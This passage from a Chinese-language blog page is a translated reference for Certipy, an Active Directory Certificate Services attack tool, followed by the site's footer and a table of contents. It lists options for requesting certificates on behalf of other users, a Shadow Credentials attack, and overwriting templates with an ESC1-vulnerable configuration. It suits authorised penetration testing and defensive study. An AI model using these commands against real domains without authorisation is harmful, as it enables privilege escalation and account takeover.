+<h3 id="req-请求证书"><a href="#req-请求证书" class="headerlink" title="req - 请求证书"></a>req - 请求证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -ca &lt;CAName&gt; -template &lt;Template&gt; [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-ca &lt;CAName&gt;</code></td>
+<td>CA 名称</td>
+</tr>
+<tr>
+<td><code>-template &lt;Template&gt;</code></td>
+<td>证书模板</td>
+</tr>
+<tr>
+<td><code>-subject &lt;DN&gt;</code></td>
+<td>请求主题</td>
+</tr>
+<tr>
+<td><code>-upn &lt;upn&gt;</code></td>
+<td>SAN UPN</td>
+</tr>
+<tr>
+<td><code>-dns &lt;dns&gt;</code></td>
+<td>SAN DNS</td>
+</tr>
+<tr>
+<td><code>-sid &lt;sid&gt;</code></td>
+<td>SID 扩展</td>
+</tr>
+<tr>
+<td><code>-on-behalf-of &lt;DOMAIN\User&gt;</code></td>
+<td>代表其他用户请求</td>
+</tr>
+<tr>
+<td><code>-pfx &lt;file&gt;</code></td>
+<td>使用现有 PFX</td>
+</tr>
+<tr>
+<td><code>-renew</code></td>
+<td>续订证书</td>
+</tr>
+<tr>
+<td><code>-web</code></td>
+<td>使用 HTTP 请求</td>
+</tr>
+<tr>
+<td><code>-dcom</code></td>
+<td>使用 DCOM 请求</td>
+</tr>
+</tbody></table>
+<h3 id="shadow-Shadow-Credentials-攻击"><a href="#shadow-Shadow-Credentials-攻击" class="headerlink" title="shadow - Shadow Credentials 攻击"></a>shadow - Shadow Credentials 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow &lt;list|add|remove|clear|info|auto&gt; [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-account &lt;target&gt;</code></td>
+<td>目标账户</td>
+</tr>
+<tr>
+<td><code>-device-id &lt;GUID&gt;</code></td>
+<td>特定设备 ID</td>
+</tr>
+<tr>
+<td><code>-out &lt;file&gt;</code></td>
+<td>保存证书&#x2F;密钥</td>
+</tr>
+</tbody></table>
+<h3 id="template-管理模板"><a href="#template-管理模板" class="headerlink" title="template - 管理模板"></a>template - 管理模板</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy template -template &lt;Name&gt; [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-save-configuration &lt;file&gt;</code></td>
+<td>保存当前配置</td>
+</tr>
+<tr>
+<td><code>-write-configuration &lt;file&gt;</code></td>
+<td>从文件应用配置</td>
+</tr>
+<tr>
+<td><code>-write-default-configuration</code></td>
+<td>应用 ESC1 易受攻击的默认配置</td>
+</tr>
+<tr>
+<td><code>-no-save</code></td>
+<td>跳过备份</td>
+</tr>
+<tr>
+<td><code>-force</code></td>
+<td>抑制确认提示</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">Certipy GitHub 仓库</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned 论文</a></li>
+<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">SpecterOps AD CS 研究</a></li>
+</ul>
+<hr>
+<p><em>本文档翻译自 Certipy Wiki，仅供安全研究和授权测试使用。</em></p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://wenfenhui.github.io">wenfenhui</a>
+            <p>原文链接：<a href="https://wenfenhui.github.io/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/">https://wenfenhui.github.io/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/</a>
+            <p>发表日期：<a href="https://wenfenhui.github.io/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/">April 7th 2026, 12:00:00 pm</a>
+            <p>更新日期：<a href="https://wenfenhui.github.io/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/">April 7th 2026, 12:31:46 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/" title="Impacket wiki中文指南">
+                    <div class="nextTitle">Impacket wiki中文指南</div>
+                </a>
+        </li>
+        <li class="previous">
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="//github.com/wenfenhui" class="iconfont-archer github" target="_blank" title="github"></a>
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Certipy-%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3"><span class="toc-number">1.</span> <span class="toc-text">Certipy 中文文档</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">一、简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Certipy-%E5%8A%9F%E8%83%BD%E7%89%B9%E6%80%A7"><span class="toc-number">1.2.1.</span> <span class="toc-text">Certipy 功能特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84-AD-CS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.</span> <span class="toc-text">支持的 AD CS 漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%89%E8%A3%85"><span class="toc-number">1.3.</span> <span class="toc-text">二、安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%AE%89%E8%A3%85-Debian-Ubuntu-Kali"><span class="toc-number">1.3.1.</span> <span class="toc-text">Linux 安装 (Debian&#x2F;Ubuntu&#x2F;Kali)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E5%AE%89%E8%A3%85-PowerShell"><span class="toc-number">1.3.2.</span> <span class="toc-text">Windows 安装 (PowerShell)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7-Certipy"><span class="toc-number">1.3.3.</span> <span class="toc-text">升级 Certipy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4"><span class="toc-number">1.3.4.</span> <span class="toc-text">故障排除</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">三、使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%AD%90%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.1.</span> <span class="toc-text">主要子命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.2.</span> <span class="toc-text">使用示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9E%9A%E4%B8%BE-AD-CS"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1. 枚举 AD CS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AF%B7%E6%B1%82%E8%AF%81%E4%B9%A6%EF%BC%88%E5%88%A9%E7%94%A8-ESC1%EF%BC%89"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2. 请求证书（利用 ESC1）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8%E8%AF%81%E4%B9%A6%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3. 使用证书进行身份验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-ESC1-ESC16"><span class="toc-number">1.5.</span> <span class="toc-text">四、提权技术 (ESC1-ESC16)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1-%E6%B3%A8%E5%86%8C%E8%80%85%E6%8F%90%E4%BE%9B%E4%B8%BB%E9%A2%98%E7%94%A8%E4%BA%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">ESC1: 注册者提供主题用于客户端身份验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%AB"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">缓解措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC2-%E4%BB%BB%E6%84%8F%E7%94%A8%E9%80%94%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.5.2.</span> <span class="toc-text">ESC2: 任意用途证书模板</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC3-%E8%AF%81%E4%B9%A6%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%90%86%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.5.3.</span> <span class="toc-text">ESC3: 证书请求代理模板</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC4-%E7%89%B9%E6%9D%83%E8%AE%BF%E9%97%AE%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.5.4.</span> <span class="toc-text">ESC4: 特权访问证书模板</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC5-%E7%89%B9%E6%9D%83%E8%AE%BF%E9%97%AE-PKI-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.5.5.</span> <span class="toc-text">ESC5: 特权访问 PKI 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC6-EDITF-ATTRIBUTESUBJECTALTNAME2-%E6%A0%87%E5%BF%97"><span class="toc-number">1.5.6.</span> <span class="toc-text">ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 标志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%AB-1"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-1"><span class="toc-number">1.5.6.4.</span> <span class="toc-text">缓解措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC7-%E7%89%B9%E6%9D%83%E8%AE%BF%E9%97%AE-CA"><span class="toc-number">1.5.7.</span> <span class="toc-text">ESC7: 特权访问 CA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-5"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC8-NTLM-%E4%B8%AD%E7%BB%A7%E5%88%B0-AD-CS-HTTP-%E7%AB%AF%E7%82%B9"><span class="toc-number">1.5.8.</span> <span class="toc-text">ESC8: NTLM 中继到 AD CS HTTP 端点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-6"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-6"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC9-%E6%97%A0%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-number">1.5.9.</span> <span class="toc-text">ESC9: 无安全扩展的证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC10-%E5%BC%B1%E8%AF%81%E4%B9%A6%E6%98%A0%E5%B0%84"><span class="toc-number">1.5.10.</span> <span class="toc-text">ESC10: 弱证书映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC11-IF-ENFORCEENCRYPTICERTREQUEST-%E6%A0%87%E5%BF%97"><span class="toc-number">1.5.11.</span> <span class="toc-text">ESC11: IF_ENFORCEENCRYPTICERTREQUEST 标志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-7"><span class="toc-number">1.5.11.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-2"><span class="toc-number">1.5.11.2.</span> <span class="toc-text">缓解措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC12-PKINIT-%E7%BC%93%E5%AD%98"><span class="toc-number">1.5.12.</span> <span class="toc-text">ESC12: PKINIT 缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC13-%E9%93%BE%E6%8E%A5%E5%88%B0%E9%AB%98%E7%89%B9%E6%9D%83%E7%BB%84%E7%9A%84%E9%A2%81%E5%8F%91%E7%AD%96%E7%95%A5"><span class="toc-number">1.5.13.</span> <span class="toc-text">ESC13: 链接到高特权组的颁发策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-8"><span class="toc-number">1.5.13.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%AB-2"><span class="toc-number">1.5.13.2.</span> <span class="toc-text">识别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC14-altSecurityIdentities-%E6%BB%A5%E7%94%A8"><span class="toc-number">1.5.14.</span> <span class="toc-text">ESC14: altSecurityIdentities 滥用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC15-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AD%96%E7%95%A5%E6%BB%A5%E7%94%A8-CVE-2024-49019"><span class="toc-number">1.5.15.</span> <span class="toc-text">ESC15: 应用程序策略滥用 (CVE-2024-49019)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC16-%E4%BB%A3%E7%90%86%E6%8F%90%E4%BE%9B%E7%A8%8B%E5%BA%8F%E6%BB%A5%E7%94%A8"><span class="toc-number">1.5.16.</span> <span class="toc-text">ESC16: 代理提供程序滥用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83"><span class="toc-number">1.6.</span> <span class="toc-text">五、命令参考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E9%80%89%E9%A1%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text">全局选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#account-%E7%AE%A1%E7%90%86%E8%B4%A6%E6%88%B7"><span class="toc-number">1.6.2.</span> <span class="toc-text">account - 管理账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#auth-%E4%BD%BF%E7%94%A8%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">auth - 使用证书认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ca-%E7%AE%A1%E7%90%86-CA"><span class="toc-number">1.6.4.</span> <span class="toc-text">ca - 管理 CA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cert-%E7%AE%A1%E7%90%86%E8%AF%81%E4%B9%A6"><span class="toc-number">1.6.5.</span> <span class="toc-text">cert - 管理证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-%E6%9E%9A%E4%B8%BE-AD-CS"><span class="toc-number">1.6.6.</span> <span class="toc-text">find - 枚举 AD CS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#forge-%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6"><span class="toc-number">1.6.7.</span> <span class="toc-text">forge - 伪造证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#relay-NTLM-%E4%B8%AD%E7%BB%A7"><span class="toc-number">1.6.8.</span> <span class="toc-text">relay - NTLM 中继</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#req-%E8%AF%B7%E6%B1%82%E8%AF%81%E4%B9%A6"><span class="toc-number">1.6.9.</span> <span class="toc-text">req - 请求证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shadow-Shadow-Credentials-%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.10.</span> <span class="toc-text">shadow - Shadow Credentials 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#template-%E7%AE%A1%E7%90%86%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.6.11.</span> <span class="toc-text">template - 管理模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90"><span class="toc-number">1.7.</span> <span class="toc-text">参考资源</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 3
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2026 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2026/04/17/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/">PE结构学习</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2026/04/08/impacket0.13wiki%E6%8C%87%E5%8D%97/">Impacket wiki中文指南</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/">Certipy 中文文档</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="工具wiki">
+                <span class="iconfont-archer">&#xe606;</span>
+                工具wiki
+            </span>
+            <span class="sidebar-tag-name" data-tags="PE">
+                <span class="iconfont-archer">&#xe606;</span>
+                PE
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+        <span class="sidebar-category-name" data-categories="工具wiki">
+            <span class="iconfont-archer">&#xe60a;</span>
+            工具wiki
+        </span>
+        <span class="sidebar-category-name" data-categories="window安全基础">
+            <span class="iconfont-archer">&#xe60a;</span>
+            window安全基础
+        </span>
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://wenfenhui.github.io",
+        root: siteMetaRoot,
+        author: "wenfenhui"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
